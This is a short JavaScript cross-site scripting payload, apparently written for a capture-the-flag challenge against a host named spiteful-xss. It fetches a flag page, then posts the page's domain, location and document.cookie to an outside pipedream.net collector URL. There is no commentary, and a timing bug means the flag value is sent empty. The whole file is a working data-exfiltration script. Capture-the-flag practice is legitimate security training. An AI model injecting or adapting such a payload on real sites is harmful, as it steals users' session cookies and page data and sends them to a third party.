const headers = new Headers()
headers.append("Content-Type", "application/json")

let flag = ""
fetch('https://spiteful-xss.acmcyber.com/flag')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Error:', response.status);
    }
  })
  .then(data => {
    console.log(data);
    flag = data;
  })
  .catch(error => {
    console.error('Error:', error);
  });

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "flag":flag
  
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eottvjlqo741dfj.m.pipedream.net", options)
